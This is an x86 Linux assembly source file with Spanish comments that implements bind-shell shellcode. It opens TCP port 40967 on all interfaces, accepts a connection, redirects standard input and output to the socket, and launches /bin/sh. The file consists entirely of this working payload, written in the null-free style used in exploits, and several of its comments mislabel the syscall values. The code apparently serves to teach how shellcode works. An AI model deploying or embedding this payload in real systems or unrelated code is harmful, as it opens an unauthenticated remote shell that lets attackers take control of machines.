;;; Mario Arturo Perez Rangel
;;; 25-03-2017
;;;
;;; shell-ne abre el puerto 40967 y deja una instancia
;;; del shell atendiendolo.
;;; Para lograrlo usa la syscall socketcall, la cual maneja
;;; dos parametros: el primero es el tipo de llamada y el segundo
;;; son los parametros de la llamada como un apuntador a los
;;; argumentos.
;;; El primer parametro lleva la connotacion de las llamadas
;;; a sistema open, bind, listen y accept. Segun el archivo
;;; /usr/include/linux/net.h tenemos los valores:
;;; SYS_SOCKET=>1, SYS_BIND=>2,SYS_CONNECT=>3, SYS_LISTEN=>4,
;;; SYS_ACCEPT=>5.
;;; El numero de llamada de socketcall es la 0x66.
;;; El arreglo de argumentos se manejan a traves del stack.
	
	section .text
	global _start

_start:

;;;  Se abre un socket.
	xor  eax,eax
	push eax       		;Protocolo de IP (0)
	push 0x1		;Socket de tipo TCP
	push 0x2		;Familia de protocolos de Internet
	mov  ecx,esp		;socket_args
	xor  ebx,ebx
	inc  ebx		;SYS_SOCKET
	mov  al,0x66		;SYS_SOCKETCALL
	int  0x80

;;; En el regreso EAX tiene el numero de descriptor de archivo
;;; socket. Para usos posteriores lo guardamos en ESI
	mov esi,eax

;;; Se asocia el socket a un numero de puerto (bind). Los argumentos
;;; de una llamada a bind son el socket, el apuntador a una
;;; estructura sockaddr_in y el tamanio de la estructura.
;;; Dentro de la estructura viene otra estructura para especificar
;;; en que direccion ip estara a la escucha. Para  simplificarnos
;;; la vida usamos INNETADDR_ANY (0).
	xor  eax,eax
	push eax		;INNETADDR_ANY, padding de ceros
	push WORD 0x07a0 	;puerto 40967 en orden "big-endian"
	push WORD 0x02		;SYS_BIND
	mov  ecx,esp

	push 0x16		;Tamanio de la estructura
	push ecx
	push esi		;descriptor del socket 
	xor  ebx,ebx
	mov  bl,0x2		;SYS_BIND
	mov  ecx,esp		;Direccion de la lista de argumentos
	mov  al,0x66		;SYS_SOCKETCALL
	int  0x80

;;; El socket se pone a la escucha. Los parametros para listen
;;; son el socket y el numero maximo de conexiones pendientes
;;; que se pueden enfilar.
	xor  ecx,ecx
	mov  cl,0x5
	push ecx		;Numero maximo de conexiones en espera 
	push esi		;descriptor del socket
	mov  ecx, esp		;Direccion de la lista de argumentos
	xor  ebx,ebx
	mov  bl, 0x4		;SYS_LISTEN
	xor  eax,eax
	mov  al,0x66		;SYS_SOCKETCALL
	int  0x80

;;; Cuando llega una conexion se llama a la funcion accept().
;;; acept recibe tres parametros: el socket, la direccion
;;; de una estructura sockaddr_in y el tamanio de la estructura.
;;; Para simplificar, no necesitamos saber en este momento la
;;; direccion del cliente por lo que el segundor y tercer
;;; argumento son cero.
	xor  ecx,ecx
	push ecx		;0
	push ecx		;0
	push esi		;Descriptor de socket (cliente)
	mov  ecx,esp		;Direcccion de la lista de argumentos
	xor  ebx,ebx
	mov  bl, 0x5		;SYS_LISTEN

	xor  eax,eax
	mov  al,0x66		;SYS_SOCKETCALL
	int  0x80

;;; Al regresar en EAX se tiene el descriptor del nuevo socket.
	mov esi,eax		;Guarda este socket en ESI

;;; Con la conexion establecida se requiere que los mensajes
;;; comunes y de error tambien se vean del lado del cliente.
;;; Para hacerlo se duplican los archivos stdin, stdout y stderr,
;;; con la syscall dup ().
	mov  ebx,esi		;Descriptor de socket (cliente)
	xor  ecx,ecx		;stdin
	
	xor  eax,eax
	mov  al, 0x3f		;syscall dup2
	int  0x80

	inc  ecx			;stdout
	xor  eax,eax
	mov  al, 0x3f		;syscall dup2
	int  0x80

	inc ecx			;stderr
	xor eax,eax
	mov al, 0x3f		;syscall dup2
	int 0x80

;;; Mandamos llamar al shell.
	xor  eax,eax
	push eax		;Terminador de arreglo de argumentos
	push 0x68732f2f	  	;//bin/sh de manera invertida
	push 0x6e69622f		;y en dos partes, en el stack
	mov  ebx,esp		;Apuntador al nombre del programa
	mov  ecx,eax		;NULL
	mov  edx,eax		;NULL
	mov  al, 0xb		;execve
	int  0x80
	
